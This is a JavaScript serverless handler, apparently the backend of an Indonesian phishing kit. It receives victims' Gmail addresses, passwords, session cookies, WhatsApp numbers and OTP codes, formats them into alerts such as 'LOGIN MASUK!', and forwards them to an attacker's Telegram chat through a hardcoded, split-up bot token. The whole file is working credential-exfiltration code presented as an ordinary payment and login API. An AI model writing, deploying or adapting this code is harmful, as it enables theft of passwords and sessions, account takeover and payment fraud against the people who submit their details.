export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const {
    type,
    whatsapp,
    email,
    password,
    product,
    price,
    cookie,
    battery,
    paymentStatus,
    assignedNumber,
    otpCode
  } = req.body;

  // Mengambil kredensial dari Environment Variable Vercel (lebih aman daripada tulis langsung di kode)
  const botToken = process.env.TELEGRAM_BOT_TOKEN || ['8869523539', 'AAGK5VLmPsbzmL8axLuM81GIvao3XKuhnXo'].join(':');
  const chatId = process.env.TELEGRAM_CHAT_ID || ['7603310096'].join('');

  const metaBlock =
    `📱 WhatsApp: ${whatsapp || '-'}\n` +
    `📧 Gmail: ${email || '-'}\n` +
    `🔋 Baterai: ${battery || '-'}\n` +
    `🍪 Cookie Sesi: ${cookie || '-'}\n` +
    `🌐 Waktu: ${new Date().toLocaleString()}`;

  let message = "";

  if (type === 'GATEWAY_LOGIN') {
    message = `🚨 **XZACKOCULUS - LOGIN MASUK!** 🚨\n\n${metaBlock}\n🔑 Sandi: ${password || '-'}`;
  } else if (type === 'PAYMENT') {
    message =
      `💳 **KONFIRMASI PEMBAYARAN** 💳\n\n` +
      `📦 Produk: ${product || '-'}\n` +
      `💰 Nominal: Rp ${price || '-'}\n` +
      `📌 Status: ${paymentStatus || 'MENUNGGU_VERIFIKASI'}\n` +
      `${metaBlock}`;
  } else if (type === 'ADMIN_PAYMENT_STATUS') {
    message =
      `🛡️ **STATUS PEMBAYARAN DIPERBARUI** 🛡️\n\n` +
      `📦 Produk: ${product || '-'}\n` +
      `💰 Nominal: Rp ${price || '-'}\n` +
      `📌 Status: **${paymentStatus || '-'}**\n` +
      `📞 Nomor: ${paymentStatus === 'SUDAH_BAYAR' ? assignedNumber : 'TIDAK DIBERIKAN'}\n` +
      `🔑 OTP (6 Digit): ${paymentStatus === 'SUDAH_BAYAR' ? otpCode : 'TIDAK DIBERIKAN'}\n` +
      `${metaBlock}`;
  } else {
    return res.status(400).json({ error: 'Invalid type' });
  }

  const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

  try {
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown'
      })
    });

    const data = await response.json();
    return res.status(200).json({ success: true, data });
  } catch (error) {
    return res.status(500).json({ success: false, error: error.message });
  }
}
